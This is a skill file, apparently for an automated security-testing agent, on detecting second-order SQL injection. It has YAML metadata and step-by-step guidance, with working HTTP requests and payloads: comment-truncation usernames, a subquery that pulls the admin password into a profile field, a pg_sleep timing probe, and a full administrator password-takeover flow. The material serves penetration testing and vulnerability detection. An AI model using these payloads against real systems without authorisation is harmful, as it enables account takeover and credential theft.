---
name: second-order-sqli
domain: injection
category: injection
tier: balanced
description: Detect stored-then-executed SQL injection where malicious input is persisted safely then later used in a vulnerable SQL context.
toolRefs:
  - httpRequest
  - parseResponse
  - compareResponses
  - recordEvidence
  - writeFinding
  - runPrimitive
  - getTargetSummary
  - runPrimitive
primitives: [secondOrderSqli]
triggers:
  - second order sql injection
  - stored sql injection test
  - deferred sql execution
  - persistent input sql sink
contextBoosts: []
toolChains: []
compositionRules: {}
mitreAttack:
  - T1190
  - T1059
owaspRefs:
  - A03:2021
---

# Second-Order SQL Injection

## When to Use
Use when an application stores user input (profile fields, usernames, settings, file names) and later reuses that stored value inside a SQL query without re-validation. Classic first-order probes on the storage endpoint may show no vulnerability, so this skill targets the *consuming* endpoint.

## Detection Approach
1. **Map storage sinks.** Identify endpoints that persist attacker-controllable data: registration, profile update, preferences, comments.
2. **Store a payload.** Submit a SQL-fragment payload (e.g. `admin'--` or a quote/comment sequence) through the storage endpoint and confirm it is saved verbatim (retrieve it back).

```http
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=Passw0rd!&email=poc@test.local
```

Storage-safe payloads to try (they must survive the storage query, which is usually parameterized or escaped):

```text
admin'--
robert');--
' || '
'||'
x' AND '1'='1
```

3. **Find consumers.** Identify later actions that read the stored value and use it in a query: login-by-username, search-by-owner, display-by-id, delete-by-name.

4. **Trigger the sink.** Perform the consuming action and observe SQL-error leakage, timing differences, or logic changes via `compareResponses`.

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

If the consumer builds `SELECT * FROM users WHERE username='admin'--' AND password='anything'`, the comment truncates the password check and authenticates as `admin` — a stored authentication bypass.

5. **Confirm with differential.** Repeat with a benign stored value vs the payloaded value; a divergent response indicates the stored value altered query semantics.

```http
POST /profile/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

display_name=benignvalue          ← baseline: 200, normal page

display_name=x' AND '1'='1        ← payload: compare status/length/content/error text
```

6. **Switch logic.** If the storage endpoint escapes but a different consumer does not, focus exploitation on that consumer. If all consumers re-validate, record as not-vulnerable.

**Extraction via second-order concatenation** — store a value that appends query output to itself, then read it back on any page that displays the stored field:

```http
POST /profile/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username='||(SELECT password FROM users WHERE username='admin')||'
```

When the consumer runs `SELECT * FROM users WHERE username='<stored>'` and the profile page renders the username, the concatenated password appears in the rendered value.

**Time-based confirmation at the consumer:**

```text
'||(SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' THEN pg_sleep(3) ELSE pg_sleep(0) END)||'
```


## Pitfalls
- Only testing the storage endpoint and declaring safe — the vulnerability lives at consumption.
- Forgetting the payload must survive any display escaping (HTML-encoding is irrelevant to SQL context).
- Using a payload that breaks the storage query instead of the later one, misattributing the error.
- Assuming parameterized storage implies parameterized consumption.

## Verification & Impact
- **Confirmed:** A stored value, when later consumed, changes SQL behavior (error, auth bypass, extra rows).
- **Suspected:** Unexpected response variance on the consuming action with stored input.
- Document the storage endpoint, the consuming endpoint, and the data flow. Use `writeFinding` with evidence from both stages.

**Classic full flow — stored comment truncation on password change:**

```text
1. Register:  username = administrator'-- , password = AttackerPw1!
2. Login:     POST /login  username=administrator'-- &password=AttackerPw1!   → session as "administrator"
3. Change password: POST /change-password  new_password=Pwned123!&confirm=Pwned123!
4. Consumer runs: UPDATE users SET password='Pwned123!' WHERE username='administrator'--'
5. Real administrator account now has the attacker-chosen password → auth bypass proven.
```

## Key Concepts
| Term | Meaning |
|------|---------|
| Storage sink | Where input is persisted |
| Consuming sink | Where stored value enters a query |
| Deferred execution | Injection fires on later use |

## Primitive Execution

The attack classes above are executable through the primitive registry. Invoke each
primitive by its id below using the run-primitive execution tool instead of re-firing
payloads manually; confirmed results pass through the evidence gate and commit as
findings with exploit proofs automatically.

| Primitive id | Coverage |
|---|---|
| `secondOrderSqli` | stored payload firing in a later query |
